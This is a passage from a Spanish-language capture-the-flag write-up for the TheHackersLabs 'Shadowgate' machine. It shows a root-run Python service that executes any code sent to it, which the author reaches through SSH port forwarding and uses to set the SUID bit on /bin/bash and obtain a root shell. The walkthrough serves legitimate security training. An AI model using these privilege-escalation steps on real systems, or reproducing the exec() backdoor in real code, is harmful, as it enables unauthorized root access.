+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mars@TheHackersLabs-Shadowgate:~$ ls
+</span></span><span style="display:flex;"><span>user.txt
+</span></span><span style="display:flex;"><span>mars@TheHackersLabs-Shadowgate:~$ cat user.txt
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><h2 id="Post">Post Explotación</h2>
+<h3 id="Privesc">Aplicando Local Port Forwarding para Abusar de Servicio Interno y Escalar Privilegios</h3>
+<p>Actualmente, nuestro usuario no tiene ningún privilegio, pero al realizar la enumeración, podremos encontrar los siguientes scripts en la ruta <code>/opt/shadowgate/bin</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mars@TheHackersLabs-Shadowgate:/opt/shadow-tools/bin$ ls -la
+</span></span><span style="display:flex;"><span>total <span style="color:#ae81ff">20</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> may  <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">2025</span> .
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#ae81ff">4</span> root root <span style="color:#ae81ff">4096</span> may  <span style="color:#ae81ff">2</span>  <span style="color:#ae81ff">2025</span> ..
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">2462</span> may  <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">2025</span> gate.py
+</span></span><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1060</span> may  <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">2025</span> shadow-client.py
+</span></span><span style="display:flex;"><span>-rw-r--r-- <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">3304</span> may  <span style="color:#ae81ff">3</span>  <span style="color:#ae81ff">2025</span> web-login.py
+</span></span></code></pre></div><p>Revisándolos, veremos que son los servicios desplegados que atacamos y todos son ejecutados por el <strong>Root</strong>.</p>
+<p>Pero el único que no hemos visto activo es el servicio que despliega el script <strong>shadow-client.py</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mars@TheHackersLabs-Shadowgate:/opt/shadow-tools/bin$ cat shadow-client.py 
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>import socket
+</span></span><span style="display:flex;"><span>import threading
+</span></span><span style="display:flex;"><span>import io
+</span></span><span style="display:flex;"><span>import contextlib
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>def handle_client<span style="color:#f92672">(</span>client_socket<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>    client_socket.send<span style="color:#f92672">(</span>b<span style="color:#e6db74">&#34;Welcome to Shadow Client Helper\n&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    client_socket.send<span style="color:#f92672">(</span>b<span style="color:#e6db74">&#34;This is an unrestricted environment. Good luck, hacker.\n&#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> True:
+</span></span><span style="display:flex;"><span>        client_socket.send<span style="color:#f92672">(</span>b<span style="color:#e6db74">&#34;&gt;&gt;&gt; &#34;</span><span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>        code <span style="color:#f92672">=</span> client_socket.recv<span style="color:#f92672">(</span>1024<span style="color:#f92672">)</span>.decode<span style="color:#f92672">()</span>.strip<span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span>        try:
+</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">=</span> io.StringIO<span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span>            with contextlib.redirect_stdout<span style="color:#f92672">(</span>output<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>                exec<span style="color:#f92672">(</span>code, globals<span style="color:#f92672">())</span>
+</span></span><span style="display:flex;"><span>            result <span style="color:#f92672">=</span> output.getvalue<span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> result.strip<span style="color:#f92672">()</span>:
+</span></span><span style="display:flex;"><span>                client_socket.send<span style="color:#f92672">(</span>result.encode<span style="color:#f92672">())</span>
+</span></span><span style="display:flex;"><span>        except Exception as e:
+</span></span><span style="display:flex;"><span>            client_socket.send<span style="color:#f92672">(</span>f<span style="color:#e6db74">&#34;Error: {e}\n&#34;</span>.encode<span style="color:#f92672">())</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>def main<span style="color:#f92672">()</span>:
+</span></span><span style="display:flex;"><span>    server <span style="color:#f92672">=</span> socket.socket<span style="color:#f92672">(</span>socket.AF_INET, socket.SOCK_STREAM<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    server.bind<span style="color:#f92672">((</span><span style="color:#e6db74">&#34;127.0.0.1&#34;</span>, 4444<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>    server.listen<span style="color:#f92672">(</span>5<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> True:
+</span></span><span style="display:flex;"><span>        client, addr <span style="color:#f92672">=</span> server.accept<span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span>        client_handler <span style="color:#f92672">=</span> threading.Thread<span style="color:#f92672">(</span>target<span style="color:#f92672">=</span>handle_client, args<span style="color:#f92672">=(</span>client,<span style="color:#f92672">))</span>
+</span></span><span style="display:flex;"><span>        client_handler.start<span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    main<span style="color:#f92672">()</span>
+</span></span></code></pre></div><p>A primera vista parece ser solo una conexión a un servicio interno (<strong>localhost</strong>) por el <strong>puerto 4444</strong>, pero analizando el código podemos ver que se trata de un intérprete de <strong>Python</strong>,
+pues no solo vemos que simula el prompt de <strong>Python</strong>, sino que vemos la función <code>exec(code, globals())</code>, lo que indica que puede ejecutar cualquier comando que le mandemos, pero solo
+en <strong>Python</strong>.</p>
+<p>En resumen, este script crea un intérprete de <strong>Python</strong> de uso interno que permite ejecutar comandos/scripts.</p>
+<p>Comprobemos con el comando <strong>ss</strong> y <strong>grep</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mars@TheHackersLabs-Shadowgate:~$ ss -tulnp | grep <span style="color:#ae81ff">4444</span>
+</span></span><span style="display:flex;"><span>tcp   LISTEN <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">5</span>                              127.0.0.1:4444       0.0.0.0:*
+</span></span></code></pre></div><p>Ahí está, sí está activo ese servicio.</p>
+<p>Para que podamos conectarnos, vamos a aplicar <strong>Local Port Forwarding</strong> aprovechando que tenemos acceso a la máquina vía SSH, y mantendremos la sesión activa para realizar cualquier
+movimiento necesario:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh -L 4444:0.0.0.0:4444 mars@192.168.100.220
+</span></span><span style="display:flex;"><span>mars@192.168.100.220<span style="color:#960050;background-color:#1e0010">&#39;</span>s password:
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>Last login: Mon Mar <span style="color:#ae81ff">16</span> 04:51:52 <span style="color:#ae81ff">2026</span>
+</span></span><span style="display:flex;"><span>mars@TheHackersLabs-Shadowgate:~$ 
+</span></span></code></pre></div><p>Funcionó y puedes comprobarlo con <strong>ss</strong> en tu máquina.</p>
+<p>Ya podemos conectarnos a ese servicio apuntando al localhost y al puerto que hayamos elegido:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc 127.0.0.1 <span style="color:#ae81ff">4444</span>
+</span></span><span style="display:flex;"><span>Welcome to Shadow Client Helper
+</span></span><span style="display:flex;"><span>This is an unrestricted environment. Good luck, hacker.
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt;
+</span></span></code></pre></div><p>Estamos dentro.</p>
+<p>Ahora, ya vimos que este servicio lo corre el <strong>Root</strong>, por lo que podemos darle <strong>permisos SUID</strong> a la <strong>Bash</strong> para escalar privilegios.</p>
+<p>Primero, veamos qué permisos tiene la <strong>Bash</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mars@TheHackersLabs-Shadowgate:/opt/shadow-tools/bin$ ls -la /bin/bash
+</span></span><span style="display:flex;"><span>-rwxr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1446024</span> mar <span style="color:#ae81ff">31</span>  <span style="color:#ae81ff">2024</span> /bin/bash
+</span></span></code></pre></div><p>Ahora, desde el servicio activo, vamos a cargar la librería <strong>os</strong> de <strong>Python</strong> y luego le damos <strong>permisos SUID</strong> a la <strong>Bash</strong>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>&gt;&gt;&gt; import os 
+</span></span><span style="display:flex;"><span>&gt;&gt;&gt; os.system<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;chmod u+s /bin/bash&#39;</span><span style="color:#f92672">)</span>
+</span></span></code></pre></div><p>Comprobemos si funcionó:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mars@TheHackersLabs-Shadowgate:/opt/shadow-tools/bin$ ls -la /bin/bash
+</span></span><span style="display:flex;"><span>-rwsr-xr-x <span style="color:#ae81ff">1</span> root root <span style="color:#ae81ff">1446024</span> mar <span style="color:#ae81ff">31</span>  <span style="color:#ae81ff">2024</span> /bin/bash
+</span></span></code></pre></div><p>Excelente, ya solo ejecutamos la <strong>Bash</strong> con privilegios:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mars@TheHackersLabs-Shadowgate:/opt/shadow-tools/bin$ bash -p
+</span></span><span style="display:flex;"><span>bash-5.2# whoami
+</span></span><span style="display:flex;"><span>root
+</span></span></code></pre></div><p>Somos <strong>Root</strong>.</p>
+<p>Busquemos la última flag:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash-5.2# cd /root
+</span></span><span style="display:flex;"><span>bash-5.2# ls
+</span></span><span style="display:flex;"><span>root.txt
+</span></span><span style="display:flex;"><span>bash-5.2# cat root.txt
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Y con esto, terminamos la máquina.</p>
+
+
+    
+    <h2 id="links-de-investigacion">Links de investigación</h2>
+    <ul>
+      <li><a href="https://www.reddit.com/r/AskComputerScience/comments/1n0l1y5/how_do_you_decode_aes_ecb/" target="_blank" rel="noopener noreferrer">https://www.reddit.com/r/AskComputerScience/comments/1n0l1y5/how_do_you_decode_aes_ecb/</a></li><li><a href="https://gchq.github.io/CyberChef/" target="_blank" rel="noopener noreferrer">https://gchq.github.io/CyberChef/</a></li>
+    </ul>
+    
+  </div>
+
+  
+
+
+  
+
+  
+
+
+
+
+
+
+
+
+
+
+<nav class="post-nav">
+  
+  <a class="post-nav-link post-nav-prev" href="http://localhost:1313/THL-writeup-lavashop/">
+    <span class="post-nav-label">← Anterior</span>
+    <span class="post-nav-title">Lavashop - TheHackerLabs</span>
+  </a>
+  
+  
+  <a class="post-nav-link post-nav-next" href="http://localhost:1313/THL-writeup-folclore/">
+    <span class="post-nav-label">Siguiente →</span>
+    <span class="post-nav-title">Folclore - TheHackerLabs</span>
+  </a>
+  
+</nav>
+
+
+
+</article>
+
+  </main>
+  <footer class="site-footer">
+  <div class="wrap">
+    <p>&copy; 2026 BerserkWings · México
+       · <a href="https://github.com/BerserkWings" target="_blank" rel="noopener noreferrer">GitHub</a>
+    </p>
+  </div>
+</footer>
+
+  
+
+
+<a href="#indice" class="back-to-top" id="backToTop" aria-label="Volver al índice">&uarr;</a>
+
+
+<script src="/js/main.min.15ff80349759f71df793ae28568ef0a6a9c3eb6efe99c9e96bad1d9236a26c31.js" integrity="sha256-Ff&#43;ANJdZ9x33k64oVo7wpqnD627&#43;mcnpa60dkjaibDE=" defer></script>
+
+</body>
+</html>
